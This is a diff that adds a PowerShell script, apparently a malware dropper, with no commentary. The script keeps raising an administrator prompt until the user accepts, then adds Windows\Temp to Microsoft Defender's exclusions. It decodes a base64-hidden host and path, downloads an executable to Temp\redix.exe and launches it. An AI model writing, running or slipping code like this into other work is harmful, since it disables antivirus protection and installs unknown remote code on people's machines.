@@ -1,0 +1,42 @@
+function Start-Loop {
+    while ($true) {
+        $cmd = "Add-MpPreference -ExclusionPath 'C:\Windows\Temp'"
+        
+        $proc = Start-Process powershell.exe `
+            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `$ErrorActionPreference='Stop'; $cmd" `
+            -Verb RunAs `
+            -PassThru
+
+        $proc.WaitForExit()
+
+        if ($proc.ExitCode -eq 0) {
+            Start-Sleep -Seconds 5
+            DownloadAndRun
+            break
+        }
+    }
+}
+
+function DownloadAndRun {
+
+    $b64_domain = "d2FpdC1sb2FkLXBhZ2UuY29t"
+    
+    $b64_path = "Z3Rybjk3NS9icnlqZi5leGU="
+
+    $url = "http://" + ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64_domain))) + "/" + ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64_path)))
+
+    $outFile = Join-Path -Path $env:windir -ChildPath "Temp\redix.exe"
+
+    $headerKey = "ny8DsFfwg1"
+    $headerValue = "FLiAHJErkN"
+    $headers = @{ $headerKey = $headerValue }
+
+    try {
+        Invoke-WebRequest -Uri $url -Headers $headers -OutFile $outFile -UseBasicParsing
+        Start-Process -FilePath $outFile
+    } catch {
+        Write-Error "Failed to download or run file: $_"
+    }
+}
+
+Start-Loop
